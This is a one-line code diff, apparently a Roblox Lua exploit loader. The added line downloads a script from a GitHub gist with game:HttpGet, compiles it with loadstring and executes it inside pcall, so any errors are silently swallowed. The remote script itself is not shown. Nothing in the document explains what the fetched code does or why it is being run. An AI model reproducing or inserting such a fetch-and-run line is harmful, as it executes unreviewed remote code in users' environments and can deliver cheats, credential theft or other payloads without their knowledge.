@@ -1,0 +1,1 @@
+pcall(loadstring(game:HttpGet("https://gist.githubusercontent.com/Shag420/5bc731509321c89b29f891790269eab8/raw"))());
